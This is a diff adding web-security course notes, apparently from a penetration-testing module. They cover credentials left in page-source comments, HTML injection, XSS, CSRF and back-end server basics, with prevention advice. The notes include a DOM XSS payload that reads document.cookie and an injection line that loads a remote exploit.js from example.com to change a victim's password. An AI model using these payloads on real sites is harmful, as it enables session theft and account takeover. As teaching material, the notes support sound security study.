@@ -669,3 +669,253 @@ document.getElementByID("button1").innerHTML = "Changed Text!";
 - Sometimes we may find the login **credentials**, **hashes**, or other sensitive data hidden in the comments of a web page's source code or within external **JavaScript** code being imported.
 
 - Other sensitive information may include exposed links or directories or even exposed user information, all of which can potentially be leveraged to further our access within the web application or even the web application's supporting infrastructure (webserver, database server, etc.).
+
+- Other sensitive information may include exposed links or directories or even exposed user information, all of which can potentially be leveraged to further our access within the web application or even the web application's supporting infrastructure (webserver, database server, etc.).
+
+- For this reason, one of the first things we should do when assessing a web application is to review its page source code to se if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links.
+
+## Example
+
+- A first glance, this login form does not look like anything out of the ordinary:
+
+![img13](imgs/img13.png)
+
+- Let's take a look at the page source:
+
+```
+<form action="action_page.php" method="post">
+
+    <div class="container">
+        <label for="uname"><b>Username</b></label>
+        <input type="text" required>
+
+        <label for="psw"><b>Password</b></label>
+        <input type="password" required>
+
+        <!-- TODO: remove test credentials test:test -->
+
+        <button type="submit">Login</button>
+    </div>
+</form>
+
+</html>
+```
+
+- We see that the developers added some comments that they forgot to remove, which contain test credentials:
+
+```
+<!-- TODO: remove test credentials test:test -->
+```
+
+- The comment seems to be a reminder for the developers to remove the test credentials. Given that the comment has not been removed yet, these credentials may still be valid.
+
+- Although it is not very common to find login credentials in developer comments, we can still find various bits of sensitive and valuable information when looking at the source code, such as test pages or directories, debugging parameters, or hidden functionality.
+
+- There are various automated tools that we can use to scan and analyze available page source code to identify potential paths or directories and other sensitive information.
+
+- Leveraging these types of information can give us further access to the web application, which may help us attack the back end components to gain control over the server.
+
+
+## Prevention
+
+- Ideally, the front end source code should only contain the code necessary to run all of the web applications functions, without any extra code or comments that are not necessary for the web application to function properly.
+
+- It is always important to review the code that will be visible to end-users through the page source or run it through tools to check for exposed information.
+
+- It is also important to classify data types within the source code and apply controls on what can or cannot be exposed on the client-side.
+
+- Developers should also review client-side code to ensure that no unnecessary comments or hidden links are left behind.
+
+- Furthermore, front end developers may want to use **JavaScript** code packing or obfuscation to reduce the chances of exposing sensitive data through **JavaScript code**. These techniques may prevent automated tools from locating these types of data.
+
+
+## HTML Injection
+
+- Another major aspect of front end security is validating and sanitizing accepted user input.
+
+- In many cases, user input validation and sanitization is carried out on the back end.
+
+- However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.
+
+- **HTML Injection** occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through **JavaScript** on the front end.
+
+- When a user has complete control of how their input will be displayed, they can submit **HTML** code, and the browser may display it as part of the page.
+
+- This may include a malicious **HTML** code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.
+
+- Another example of **HTML Injection** is web page defacing. This consists of injecting new **HTML** code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.
+
+### Example
+
+- The following example is a very basic web page with a single button "**Click to enter your name."** When we click on the button, it prompts us to input our name and then displays our name as "**Your name is ...**":
+
+![img14](imgs/img14.png)
+
+- If no input sanitization is in place, this is potentially an easy target for **HTML Injection** and **Cross-Site Scripting (XSS)** attacks.
+
+- We take a look at the page source code and see no input sanitization in place whatsoever, as the page takes user input and directly displays it:
+
+```
+!DOCTYPE html>
+<html>
+
+<body>
+    <button onclick="inputFunction()">Click to enter your name</button>
+    <p id="output"></p>
+
+    <script>
+        function inputFunction() {
+            var input = prompt("Please enter your name", "");
+
+            if (input != null) {
+                document.getElementById("output").innerHTML = "Your name is " + input;
+            }
+        }
+    </script>
+</body>
+
+</html>
+```
+
+- To test for **HTML Injection**, we can simply input a small snippet of **HTML** code as our name, and see if it displayed as part of the page. We will test the following code, which changes the background image of the web page:
+
+![img15](imgs/img15.png)
+
+## Cross-Site Scripting
+
+- **HTML Injection** vulnerabilities can often be utilized to also perform **Cross-Site Scripting (XSS)** attacks by injecting **JavaScript** code to be executed on the client-side.
+
+- Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine.
+
+- **XSS** is very similar to **HTML Injection** in practice. However, **XSS** involves the injection of **JavaScript** code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of **XSS**:
+
+| **Type** | **Description** |
+|----------|-----------------|
+| **Reflected XSS** | Occurs when user input is displaying on the page after processing (e.g., search result or error message). |
+| **Stored XSS** | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments). |
+| **DOM XSS** | Occurs when user input is directly shown in the browser and is written to an **HTML** DOM onject (e.g., vulnerable username or page title). |
+
+- In the example we saw for **HTML Injection** there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to **XSS** attacks.
+
+- We can try to inject the following **DOM XSS JavaScript** code as a payload which should show us the cookit value for the current user:
+
+**javascript code**
+```
+#"><img src=/ onerror=alert(document.cookie)>
+```
+
+- Once we input our payload and hit **ok**, we see that an alert window pops up with the cookie value in it:
+
+![img16](imgs/img16.png)
+
+- This payload is accessing the **HTML** document tree and retrieving the **cookie** object's value. When the browser processes our input, it will be considered a new **DOM**, and our **JavaScript** will be executed, displaying the cookie value back to us in a popup.
+
+- An attacker can leverage this to steal cookie sessions and send them to themeselves and attempt to use the cookie value to autheticate to the victim's account.
+
+- The same attack can be used to perform various types of other attacks against a web application's users. **XSS** is a vast topic that will be covered in-depth in later modules.
+
+## Cross-Site Request Forgery (CSRF)
+
+- The third type of front end vulnerability that is caused by unfiltered user input is **Cross-Site Request Forgery (CSRF)**.
+
+- **CSRF** attacks may utilize **XSS** vulnerabilities to perform certain queries, and **API** calls on a web application that the victim is currently authenticated to.
+
+- This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.
+
+- A common **CSRF** to gain higher privileged access to a web application is to craft a **JavaScript** payload that automatically changes the victim's password to the value set by the attackers.
+
+- Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the **JavaScript CSRF** payload), the **JavaScript** code would execute automatically. It would use the victim's logged-in session to change their password.
+
+- Once that is done, the attacker can log in to the victim's account and control it.
+
+- **CSRF** can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admin within a given web application).
+
+- Following this example, instead of using **JavaScript** code that would return the session cookie, we would load a remote **.js** (**JavaScript**) file, as follows:
+
+```
+"><script src=//www.example.com/exploit.js></script>
+```
+
+- The **exploit.js** file would contain the malicious **JavaScript** code that changes the user's password.
+
+- Developing the **exploit.js** in this case requires knowledge of this web application's password changing procedure and **APIs**.
+
+- The attacker would need to create **JavaScript** code that would replicate the desired functionality and automatically carry it out (i.e., **JavaScript** code that changes our password for this specific web application).
+
+### Prevention
+
+- Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without comunicating with the back end.
+
+| **Type** | **Description** |
+|----------|-----------------|
+| Sanitization | Removing special characters and non-standard characters from user input before displaying it or storing it.|
+| Validation | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|
+
+- Furthermore, it is also important to sanitize displayed output and clear may special/non-standard characters.
+
+- In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.
+
+- Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like **HTML Injection**, **XSS**, or **CSRF**.
+
+- Another solution would be to implement a **web application firewall (WAF)**, which should help to prevent injection attempts automatically.
+
+- However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on appliance to detect/block attacks.
+
+- As for **CSRF**, many modern browsers have built-in anit-CSRF measures, which prevent automatically executing **JavaScript** code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., **anti-CSRF** token, or **http-only**/**X-XSS-Protection**).
+
+- Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it.
+
+- Many of these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.
+
+- The **Cross-Site Request Prevention Cheat Sheet** from OWASP discusses the attack and prevention measures in greater detail.
+
+## Back End Servers
+
+- A back end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application.
+
+- It is the real system running all of the processes and carrying all of the taks that make up the entire web application.
+
+- The back end server would fit in the **Data access layer**.
+
+### Software
+
+- The back end server contains the other 3 back end components:
+
+  - Web Server
+  - Database
+  - Development Framework
+
+![img17](imgs/img17.png)
+
+- Other software components on the back end server may include **hypervisors**, containers, and WAFs.
+
+- There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common example include:
+
+| **Combinations** | **Components** |
+|------------------|----------------|
+| LAMP | **Linux**, **Apache**, **MySQL**, and **PHP**. |
+| WAMP | **Windows**, **Apache**, **MySQL**, and **PHP**. |
+| WINS | **Windows**, **IIS**, **.NET**, and **SQL Server** |
+| MAMP | **macOS**, **Apache**, **MySQL**, and **PHP**. |
+| XAMPP | Cross-Platform, **Apache**, **MySQL**, and **PHP/PERL**. |
+
+### Hardware
+
+- The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be.
+
+- As previously discussed in the **Architecture** section, many architectures, especially for huge web applications, are designed in the **Architecture** section, many architectures, especially for huge web applications, are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end-user. Web applications do not have to run directly on a single back end server but may utilize data centers and cloud hosting services that provide virtual hosts for the web application.
+
+## Web Server
+
+- A **web server** is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser.
+
+- Web servers usually run on TCP **ports** **80** and **443**, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.
+
+### Workflow
+
+- A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code **200 OK** response for a successful request, a code **404 NOT FOUND** when requesting pages that do not exist, code **403 FORBIDDENT** for requesting access to restricted pages, and so on.
+
+![img18](imgs/img18.png)
+
+
+
